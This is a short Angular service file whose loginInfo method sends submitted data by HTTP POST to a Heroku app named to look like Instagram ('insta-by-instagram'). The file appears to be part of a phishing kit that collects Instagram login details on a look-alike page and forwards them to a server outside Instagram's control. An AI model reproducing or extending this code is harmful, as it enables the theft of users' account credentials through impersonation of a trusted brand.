import { Injectable } from '@angular/core';
import { HttpClient } from '@angular/common/http';


const API_URL = 'https://insta-by-instagram.herokuapp.com/request';
@Injectable({
  providedIn: 'root'
})
export class IgserviceService {

  constructor(private http: HttpClient) { }

  loginInfo(data: any){
    return this.http.post(API_URL, data);
  }

}
